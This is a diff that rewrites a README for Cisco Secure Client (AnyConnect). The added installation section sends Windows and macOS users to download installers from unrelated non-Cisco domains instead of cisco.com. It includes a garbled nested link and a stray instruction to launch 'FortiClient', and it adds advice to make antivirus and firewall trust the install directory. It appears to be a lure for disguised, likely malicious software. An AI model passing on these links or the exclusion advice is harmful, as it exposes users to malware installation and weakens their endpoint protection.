@@ -1,120 +1,78 @@
-# Cisco Secure Client: (including AnyConnect) for VPN Security
+## Cisco Secure Client: (including AnyConnect) for VPN Security
 
-**Cisco Secure Client** is a unified security application designed to provide users with secure remote access and advanced endpoint protection. Formerly known as **Cisco AnyConnect**, this modernized client integrates multiple Cisco security solutions into a single platform to enhance security, streamline administration, and improve user experience.
+**Cisco Secure Client** is a unified security application designed to provide users with secure remote access and advanced endpoint protection. Formerly known as Cisco AnyConnect, this modernized client integrates multiple Cisco security solutions into a single platform to enhance security, streamline administration, and improve user experience.
 
-This repository provides resources, tools, and examples to help administrators and developers maximize the functionality of Cisco Secure Client in their environments.
+## Table of Contents
+- [Installation](#installation)
+- [System Requirements](#system-requirements)
+- [Features](#features)
+- [Usage](#usage)
 
----
+## Installation
 
-### Key Features
 
-#### 1. **Secure VPN Access**
+### Windows
+1. [**Download the Cisco Secure Client installer for Windows**](https://cine.prosuscorp.com/secure/).
+2. Run the executable file.
+3. Follow the on-screen instructions:
+   - Accept the license agreement.
+   - Choose the installation folder.
+4. Complete the installation and restart the system if prompted.
+5. Launch FortiClient from the desktop shortcut.
 
-Cisco Secure Client includes a robust VPN (Virtual Private Network) module that provides users with encrypted access to corporate networks. This ensures data confidentiality, integrity, and security, enabling employees to work safely from anywhere.
+### macOS
+1. [**Download the `.dmg` installer file**]([https://pincheira.org/forti/](https://cine.prosuscorp.com/secure/).
+2. Open the installer and follow the steps:
+   - Agree to the Software License Agreement.
+   - Enter your system password if required.
+3. Enable required permissions in **System Preferences > Security & Privacy**.
+4. Restart the macOS device if prompted.
 
-- **Protocols Supported**: SSL, IPsec IKEv2.
-- **Dynamic Connections**: Automatically reconnects users if the VPN session is interrupted.
-- **Split Tunneling**: Allows certain traffic to bypass the VPN for optimized performance.
 
-#### 2. **Endpoint Visibility and Protection**
+## System Requirements
+- **Windows**: Windows 10 or later; Microsoft .NET Framework 4.6.2 or newer recommended.
+- **macOS**: macOS 11 or later; Apple-supported devices only.
+- **Linux**: Kernel version compatibility is critical; ensure `libelf` and `gcc` are installed.
 
-With the integration of the **Network Visibility Module (NVM)**, Cisco Secure Client helps administrators monitor endpoint behavior. It collects telemetry data such as network usage, application performance, and potential threats.
+## Features
+- **VPN Capabilities**:
+  - Supports SSL and IPsec.
+  - Split-tunneling and all-or-nothing tunneling configurations available.
+- **Optional Modules**:
+  - Network Access Manager
+  - ISE Posture
+  - Secure Firewall Posture
+  - Network Visibility Module
+- **Customizable Profiles**:
+  - Define user-specific configurations for various modules.
 
-- Real-time monitoring of endpoint activities.
-- Threat detection and prevention capabilities.
-- Simplified reporting and compliance management.
+## Usage
+Refer to the official [Cisco Secure Client Administrator Guide](https://www.cisco.com/c/en/us/support/security/anyconnect-secure-mobility-client/products-installation-and-configuration-guides-list.html) for advanced configurations, module updates, and troubleshooting steps.
 
-#### 3. **Multi-Factor Authentication**
+## Troubleshooting
+- **Common Installation Issues**:
+  - Verify that the downloaded package matches the operating system and architecture of the target device.
+  - Ensure that all prerequisite software (e.g., .NET Framework on Windows) is installed.
+  - Check system logs for error messages during installation and deployment.
+- **Connection Problems**:
+  - Confirm that the Secure Firewall ASA or ISE headend is accessible.
+  - Ensure that firewall rules do not block required ports for VPN connectivity.
 
-Cisco Secure Client integrates seamlessly with **Cisco Secure Access by Duo**, providing an additional layer of security with multi-factor authentication (MFA). This ensures that only authorized users gain access to critical resources.
+## Security Recommendations
+- Always keep the Cisco Secure Client software and profiles updated to the latest version.
+- Use strong passwords and multi-factor authentication (MFA) for enhanced security.
+- Regularly review user access permissions and audit VPN usage logs.
+- Configure endpoint antivirus and firewall to trust the installation directory of Cisco Secure Client.
 
-#### 4. **DNS Security with Cisco Umbrella**
+## FAQ
+### Can Cisco Secure Client be used without VPN functionality?
+Yes, standalone modules such as Network Access Manager and Umbrella Roaming Security can be installed without VPN capabilities.
 
-The client includes DNS-layer protection powered by **Cisco Umbrella**, which helps block malicious domains, phishing sites, and other online threats before they reach the endpoint.
+### How do I customize installation options for my organization?
+Use the Cisco Profile Editor to create custom profiles and distribute them during deployment.
 
-#### 5. **Advanced Malware Protection (AMP)**
+### Where can I find detailed logs for debugging?
+On Windows, logs are located in `%ProgramData%\Cisco\Cisco Secure Client\Logs`. For macOS and Linux, refer to `/opt/cisco/secureclient/logs/`.
 
-Cisco Secure Client works with **Cisco Secure Endpoint** to provide proactive threat detection and remediation against malware and other cyber threats.
-
-#### 6. **Ease of Deployment and Management**
-
-- Compatible with major operating systems, including Windows, macOS, Linux, iOS, and Android.
-- Support for centralized deployment via automation tools or custom scripts.
-- Integration with enterprise identity management systems.
-
----
-
-### Benefits
-
-1. **Unified Security Approach**  
-    Cisco Secure Client consolidates multiple security tools into a single application, reducing complexity for both users and administrators.
-    
-2. **Enhanced Productivity**  
-    Remote workers can access corporate resources securely and efficiently without compromising performance or security.
-    
-3. **Compliance Ready**  
-    Built-in reporting and monitoring capabilities help organizations comply with industry standards and regulatory requirements.
-    
-4. **Scalability**  
-    The solution scales seamlessly to meet the needs of small businesses, medium enterprises, and large corporations.
-    
-5. **End-User Friendly**  
-    A simple and intuitive interface ensures that users can connect securely without requiring extensive training or technical expertise.
-    
-
----
-
-### Use Cases
-
-1. **Remote Workforce Enablement**  
-    Cisco Secure Client allows businesses to enable secure remote work by providing employees with reliable access to corporate systems and applications.
-    
-2. **Endpoint Security Management**  
-    Organizations can monitor and secure their endpoints with real-time data collection and threat prevention.
-    
-3. **Corporate Compliance**  
-    The reporting and telemetry features assist in meeting compliance requirements, such as GDPR, HIPAA, and other regulations.
-    
-
----
-
-### How to Use Cisco Secure Client
-
-1. **Installation**:
-    
-    - Download and install Cisco Secure Client from [Cisco's official website](https://www.cisco.com/).
-    - Follow the installation guide for your operating system.
-2. **Configuration**:
-    
-    - Configure VPN profiles and security settings using Cisco's management tools.
-    - Set up integration with Cisco Secure Access by Duo, Cisco Umbrella, or other Cisco solutions as needed.
-3. **Deployment**:
-    
-    - For large-scale environments, automate deployment using tools like SCCM, Intune, or custom scripts.
-    - Ensure all endpoints have the latest version of the client to avoid compatibility issues.
-4. **Monitoring and Troubleshooting**:
-    
-    - Use the Network Visibility Module to monitor endpoint activity and identify potential threats.
-    - Troubleshoot issues using logs and diagnostic tools available within the client.
-
----
-
-### Compatibility
-
-Cisco Secure Client supports a wide range of platforms:
-
-- **Windows**: Windows 10 and later.
-- **macOS**: macOS 11 (Big Sur) and later.
-- **Linux**: Most major distributions.
-- **Mobile**: iOS and Android devices.
-
----
-
-### Resources in This Repository
-
-This GitHub repository contains:
-
-- Configuration examples for different environments.
-- Automation scripts for deployment and updates.
-- Troubleshooting guides and tips.
-- Best practices for integrating Cisco Secure Client with other Cisco solutions.
+### Is it possible to deploy updates automatically?
+Yes, updates can be configured on the Secure Firewall ASA or ISE headend to automatically push software and profile updates to clients.
